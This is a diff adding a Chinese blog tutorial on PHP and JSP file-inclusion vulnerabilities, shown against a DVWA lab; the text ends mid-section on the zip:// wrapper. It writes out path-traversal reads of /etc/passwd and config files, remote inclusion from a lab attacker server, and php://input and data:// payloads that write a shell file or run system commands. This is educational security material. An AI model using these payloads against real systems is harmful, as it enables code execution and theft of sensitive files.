@@ -1,0 +1,800 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="漏洞简介；注入点；漏洞类型；验证 &amp; 利用；防护绕过；防范方法；补充知识；其他。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《Web安全》02. 文件包含漏洞">
+<meta property="og:url" content="https://blog.lens-shrine.top/2023/09/07/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="镜坛">
+<meta property="og:description" content="漏洞简介；注入点；漏洞类型；验证 &amp; 利用；防护绕过；防范方法；补充知识；其他。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-05-23.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-07-10.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-49-01.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-12-24.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-29-01.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-28-11.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-34-23.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-22-26.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-26-55.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-54-13.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-56-14.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-23-09.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-25-17.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-09-47.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-16-09.png">
+<meta property="article:published_time" content="2023-09-07T10:49:06.000Z">
+<meta property="article:modified_time" content="2024-12-02T03:03:06.000Z">
+<meta property="article:author" content="镜坛主">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.lens-shrine.top/assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-05-23.png"><title>《Web安全》02. 文件包含漏洞 | 镜坛</title><link ref="canonical" href="https://blog.lens-shrine.top/2023/09/07/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":2},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":true},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbtack"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《Web安全》02. 文件包含漏洞</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-12-02</span></span></div></header><div class="post-body"><blockquote>
+<p>本系列侧重方法论，各工具只是实现目标的载体。<br>命令与工具只做简单介绍，其使用另见《软件工具录》。</p>
+</blockquote>
+
+        <h1 id="1：漏洞简介"   >
+          <a href="#1：漏洞简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#1：漏洞简介" class="headerlink" title="1：漏洞简介"></a>1：漏洞简介</h1>
+      <p>文件包含漏洞几乎只存在于 PHP。</p>
+<p>对于 Java 的文件包含来说，造成的危害只有文件读取或下载，一般情况下无法进行命令执行或代码执行。</p>
+<ul>
+<li>因为一般情况下 Java 对于文件的包含并不能将非 jsp 文件当成 Java 代码去执行</li>
+<li>而如果存在 jsp 文件是一句话木马文件，可以直接去访问利用，并不需要多此一举去包含它来使用</li>
+<li>除非在某些特殊场景下，如某些目录权限不够，可以尝试利用包含来绕过（理论上）</li>
+</ul>
+
+        <h2 id="1-1：漏洞原理"   >
+          <a href="#1-1：漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-1：漏洞原理" class="headerlink" title="1.1：漏洞原理"></a>1.1：漏洞原理</h2>
+      <p>文件包含漏洞：如果动态包含的文件路径参数用户可控，攻击者可以操纵该路径，试图包含任意文件并解析执行。</p>
+<p>文件包含：允许程序在执行过程中动态引入其他文件的内容，可提高代码的可维护性、可复用性和组织性。</p>
+<ul>
+<li>例如：将经常重复使用的函数或特定的页面写到单个文件中，需要使用的时候直接包含此文件即可</li>
+</ul>
+
+        <h2 id="1-2：危害"   >
+          <a href="#1-2：危害" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2：危害" class="headerlink" title="1.2：危害"></a>1.2：危害</h2>
+      <p>漏洞危害：</p>
+<ul>
+<li>读取敏感文件信息</li>
+<li>远程包含 webshell，执行任意代码，或者进行内网探测</li>
+<li>配合文件上传，执行任意代码</li>
+<li>配合伪协议，进行文件读取、代码执行或内网探测</li>
+</ul>
+
+        <h2 id="1-3：利用条件"   >
+          <a href="#1-3：利用条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-3：利用条件" class="headerlink" title="1.3：利用条件"></a>1.3：利用条件</h2>
+      <ol>
+<li>无版本限制</li>
+<li>文件包含路径参数可被攻击者操控且过滤不严格</li>
+<li>相关配置没有对可包含的路径进行限制</li>
+</ol>
+
+        <h2 id="1-4：根本原因"   >
+          <a href="#1-4：根本原因" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-4：根本原因" class="headerlink" title="1.4：根本原因"></a>1.4：根本原因</h2>
+      
+        <h3 id="1-4-1：相关底层源代码"   >
+          <a href="#1-4-1：相关底层源代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-4-1：相关底层源代码" class="headerlink" title="1.4.1：相关底层源代码"></a>1.4.1：相关底层源代码</h3>
+      <p><code>Java：jsp 静态包含</code></p>
+<figure class="highlight jsp"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">&quot;test.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>Java：jsp 动态包含</code></p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用 JSTL（JavaServer Pages Standard Tag Library）中的 &lt;c:<span class="keyword">import</span>&gt; 标签，从外部 URL 或其他资源动态加载内容 --&gt;</span><br><span class="line">&lt;c:<span class="keyword">import</span> url=<span class="string">&quot;$&#123;pageToInclude&#125;&quot;</span> /&gt;</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;jsp:include&gt; 标签用来在请求时动态加载页面 --&gt;</span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;$&#123;includePage&#125;&quot;</span> /&gt;</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>PHP：require</code></p>
+<ul>
+<li>找不到被包含的文件时会产生致命错误，并停止脚本运行</li>
+</ul>
+<hr>
+<p><code>PHP：require_once</code></p>
+<ul>
+<li>如果文件已经被包含，则不会再次包含</li>
+</ul>
+<hr>
+<p><code>PHP：include</code></p>
+<ul>
+<li>找不到被包含的文件时产生警告，脚本将继续运行</li>
+</ul>
+<hr>
+<p><code>PHP：include_once</code></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$file_to_include</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="2：注入点"   >
+          <a href="#2：注入点" class="heading-link"><i class="fas fa-link"></i></a><a href="#2：注入点" class="headerlink" title="2：注入点"></a>2：注入点</h1>
+      <p>注入点正常情况下是用来提供动态文件包含的功能。</p>
+<p>常见注入点：</p>
+<ul>
+<li>在实现代码复用时，可能使用动态文件包含</li>
+<li>在需要进行热更新的情况下，可能使用动态文件包含</li>
+<li>一些框架代码会引入动态文件包含功能</li>
+<li>从 URL 上观察关键词，与文件相关的字眼，都可能存在文件包含漏洞</li>
+</ul>
+
+        <h1 id="3：漏洞类型"   >
+          <a href="#3：漏洞类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#3：漏洞类型" class="headerlink" title="3：漏洞类型"></a>3：漏洞类型</h1>
+      <p>文件包含漏洞分为：</p>
+<ul>
+<li>本地文件包含（Local File Include，LFI）</li>
+<li>远程文件包含（Remote File Include，RFI）</li>
+</ul>
+
+        <h1 id="4：验证-利用"   >
+          <a href="#4：验证-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#4：验证-利用" class="headerlink" title="4：验证 &amp; 利用"></a>4：验证 &amp; 利用</h1>
+      
+        <h2 id="4-1：漏洞验证"   >
+          <a href="#4-1：漏洞验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-1：漏洞验证" class="headerlink" title="4.1：漏洞验证"></a>4.1：漏洞验证</h2>
+      <p>判断方式：</p>
+<ul>
+<li>包含一个系统本地文件进行测试</li>
+<li>包含一个远程文件进行测试</li>
+</ul>
+<p>若包含的文件被成功读取或运行，则漏洞存在。</p>
+<hr>
+<p>对于 Windows 系统，可以尝试本地包含以下文件进行测试：</p>
+<ul>
+<li><code>C:\Windows\win.ini</code></li>
+<li><code>C:/Windows/win.ini</code></li>
+<li><code>C:\Windows\System32\drivers\etc\hosts</code></li>
+<li><code>../../index.php</code></li>
+<li><code>../../config.php</code></li>
+</ul>
+<p>对于 Linux 系统，可以尝试本地包含以下文件进行测试：</p>
+<ul>
+<li><code>/etc/passwd</code></li>
+<li><code>/etc/hostname</code></li>
+<li><code>../../index.php</code></li>
+<li><code>../../config.php</code></li>
+</ul>
+
+        <h2 id="4-2：本地文件包含"   >
+          <a href="#4-2：本地文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2：本地文件包含" class="headerlink" title="4.2：本地文件包含"></a>4.2：本地文件包含</h2>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>代码未对可以包含的路径进行限制或限制不严格</li>
+<li>具有可读权限</li>
+</ul>
+<p><strong>漏洞利用</strong>：</p>
+<ul>
+<li>借助回溯符【<code>../</code>】读取敏感信息</li>
+</ul>
+<p><strong>漏洞利用 - 方式 2</strong>：</p>
+<ul>
+<li>直接通过绝对路径包含敏感文件</li>
+</ul>
+<p><strong>漏洞利用 - 方式 3</strong>：</p>
+<ul>
+<li>通过 <code>file://</code> 协议包含敏感文件进行读取</li>
+</ul>
+<p><strong>漏洞利用 - 方式 4</strong>：</p>
+<ul>
+<li>配合文件上传，包含图片马等 Webshell 进行利用</li>
+</ul>
+
+        <h3 id="4-2-1：示例（读取文件）"   >
+          <a href="#4-2-1：示例（读取文件）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-1：示例（读取文件）" class="headerlink" title="4.2.1：示例（读取文件）"></a>4.2.1：示例（读取文件）</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>正常提供的功能如下：</li>
+</ul>
+<p><code>?page=./file1.php</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-05-23.png" alt="Alt text"></p>
+<ul>
+<li>通过绝对路径包含敏感文件进行读取：</li>
+</ul>
+<p><code>?page=C:/Windows/win.ini</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-07-10.png" alt="Alt text"></p>
+
+        <h3 id="4-2-2：示例（读取文件）"   >
+          <a href="#4-2-2：示例（读取文件）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-2：示例（读取文件）" class="headerlink" title="4.2.2：示例（读取文件）"></a>4.2.2：示例（读取文件）</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>通过 <code>file://</code> 协议包含敏感文件进行读取</li>
+</ul>
+<p><code>?page=file://C:/Windows/win.ini</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-49-01.png" alt="Alt text"></p>
+
+        <h3 id="4-2-3：示例（执行代码）"   >
+          <a href="#4-2-3：示例（执行代码）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-3：示例（执行代码）" class="headerlink" title="4.2.3：示例（执行代码）"></a>4.2.3：示例（执行代码）</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>配合文件上传等操作进行代码执行：</li>
+</ul>
+<p><code>?page=../../../../../../../phpinfo.txt</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-12-24.png" alt="Alt text"></p>
+
+        <h2 id="4-3：远程文件包含"   >
+          <a href="#4-3：远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-3：远程文件包含" class="headerlink" title="4.3：远程文件包含"></a>4.3：远程文件包含</h2>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>php.ini 文件中 allow_url_include &#x3D; On</li>
+<li>php.ini 文件中 allow_url_fopen &#x3D; On</li>
+</ul>
+<p><strong>漏洞利用</strong>：</p>
+<ol>
+<li>将准备包含的文件放置到一台服务器，并测试是否能访问</li>
+<li>直接通过 URL 远程包含即可</li>
+</ol>
+
+        <h3 id="4-3-1：示例"   >
+          <a href="#4-3-1：示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-3-1：示例" class="headerlink" title="4.3.1：示例"></a>4.3.1：示例</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<p>实验环境：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">IP</th>
+<th align="left">主机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">192.168.8.222</td>
+<td align="left">Win 7（目标机器）</td>
+</tr>
+<tr>
+<td align="left">192.168.8.1</td>
+<td align="left">Win 10（恶意服务器）</td>
+</tr>
+</tbody></table></div>
+<hr>
+<p>远程包含文件实现代码执行：</p>
+<p><code>?page=http://192.168.8.1:8000/phpinfo.txt</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-29-01.png" alt="Alt text"></p>
+
+        <h2 id="4-4：伪协议【php-input】"   >
+          <a href="#4-4：伪协议【php-input】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-4：伪协议【php-input】" class="headerlink" title="4.4：伪协议【php:&#x2F;&#x2F;input】"></a>4.4：伪协议【php:&#x2F;&#x2F;input】</h2>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>代码过滤不严格</li>
+<li>伪协议 <code>php:</code> 未被过滤</li>
+<li>php.ini 文件中 allow_url_include &#x3D; On</li>
+</ul>
+<p><strong>漏洞利用</strong>：</p>
+<ul>
+<li>URL 指定伪协议 <code>php://input</code>，同时 POST 传递 PHP 代码，进行代码执行</li>
+</ul>
+
+        <h3 id="4-4-1：示例（写文件）"   >
+          <a href="#4-4-1：示例（写文件）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-4-1：示例（写文件）" class="headerlink" title="4.4.1：示例（写文件）"></a>4.4.1：示例（写文件）</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>URL 指定伪协议</li>
+</ul>
+<p><code>?page=php://input</code></p>
+<ul>
+<li>POST 传递数据</li>
+</ul>
+<p><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;), &quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-28-11.png" alt="Alt text"></p>
+
+        <h3 id="4-4-2：示例（执行命令）"   >
+          <a href="#4-4-2：示例（执行命令）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-4-2：示例（执行命令）" class="headerlink" title="4.4.2：示例（执行命令）"></a>4.4.2：示例（执行命令）</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>URL 指定伪协议</li>
+</ul>
+<p><code>?page=php://input</code></p>
+<ul>
+<li>POST 传递数据</li>
+</ul>
+<p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-34-23.png" alt="Alt text"></p>
+
+        <h2 id="4-5：伪协议【php-filter】"   >
+          <a href="#4-5：伪协议【php-filter】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-5：伪协议【php-filter】" class="headerlink" title="4.5：伪协议【php:&#x2F;&#x2F;filter】"></a>4.5：伪协议【php:&#x2F;&#x2F;filter】</h2>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>代码过滤不严格</li>
+<li>伪协议 <code>php:</code> 未被过滤</li>
+</ul>
+<p><strong>漏洞利用</strong>：</p>
+<ul>
+<li>传递绝对路径、相对路径，通过 <code>php://filter/read/resource=</code> 读取明文形式的文件内容（可能造成报错告警）</li>
+</ul>
+<p><strong>漏洞利用 - 方式 2</strong>：</p>
+<ul>
+<li>传递绝对路径、相对路径，通过 <code>php://filter/read=convert.base64-encode/resource=</code> 读取 Base64 形式的文件内容</li>
+</ul>
+<p><strong>漏洞利用 - 方式 3</strong>：</p>
+<ul>
+<li>传递网络地址（http|https|ftp），通过 <code>php://filter/read=convert.base64-encode/resource=</code> 读取 Base64 形式的远程文件（内网探测）</li>
+</ul>
+
+        <h3 id="4-5-1：示例"   >
+          <a href="#4-5-1：示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-5-1：示例" class="headerlink" title="4.5.1：示例"></a>4.5.1：示例</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>提供绝对路径读取文件</li>
+</ul>
+<p><code>?page=php://filter/read=convert.base64-encode/resource=C:/Windows/win.ini</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-22-26.png" alt="Alt text"></p>
+
+        <h3 id="4-5-2：示例-2"   >
+          <a href="#4-5-2：示例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-5-2：示例-2" class="headerlink" title="4.5.2：示例 2"></a>4.5.2：示例 2</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>通过网址读取文件</li>
+</ul>
+<p><code>?page=php://filter/read=convert.base64-encode/resource=http://192.168.8.1:8000/phpinfo.txt</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-26-55.png" alt="Alt text"></p>
+
+        <h2 id="4-6：伪协议【data-】"   >
+          <a href="#4-6：伪协议【data-】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-6：伪协议【data-】" class="headerlink" title="4.6：伪协议【data:&#x2F;&#x2F;】"></a>4.6：伪协议【data:&#x2F;&#x2F;】</h2>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>代码过滤不严格</li>
+<li>伪协议 <code>data:</code> 未被过滤</li>
+<li>php.ini 文件中 allow_url_include &#x3D; On</li>
+</ul>
+<p><strong>漏洞利用</strong>：</p>
+<ul>
+<li>通过 <code>data://text/plain,</code> 明文传递 PHP 代码，进行代码执行</li>
+</ul>
+<p><strong>漏洞利用 - 方式 2</strong>：</p>
+<ul>
+<li>通过 <code>data://text/plain;base64,</code> 以 Base64 形式传递 PHP 代码，进行代码执行</li>
+</ul>
+
+        <h3 id="4-6-1：示例"   >
+          <a href="#4-6-1：示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-6-1：示例" class="headerlink" title="4.6.1：示例"></a>4.6.1：示例</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>通过 <code>data://text/plain,</code> 明文传递 PHP 代码，进行代码执行</li>
+</ul>
+<p><code>?page=data:text/plain,&lt;?php system(whoami);?&gt;</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-54-13.png" alt="Alt text"></p>
+
+        <h3 id="4-6-2：示例-2"   >
+          <a href="#4-6-2：示例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-6-2：示例-2" class="headerlink" title="4.6.2：示例 2"></a>4.6.2：示例 2</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>通过 <code>data://text/plain;base64,</code> 以 Base64 形式传递 PHP 代码，进行代码执行</li>
+</ul>
+<p><code>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk7Pz4=</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-56-14.png" alt="Alt text"></p>
+
+        <h2 id="4-7：伪协议【zip-】"   >
+          <a href="#4-7：伪协议【zip-】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-7：伪协议【zip-】" class="headerlink" title="4.7：伪协议【zip:&#x2F;&#x2F;】"></a>4.7：伪协议【zip:&#x2F;&#x2F;】</h2>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>目标环境支持 zip 流</li>
+<li>伪协议 <code>zip:</code> 未被过滤</li>
+<li>能获取压缩包的路径</li>
+</ul>
+<p><strong>漏洞利用</strong>：</p>
+<ul>
+<li>上传一个恶意代码的 zip 压缩文件，通过 <code>zip://&lt;zip文件路径&gt;#&lt;内部文件路径&gt;</code> 进行代码执行</li>
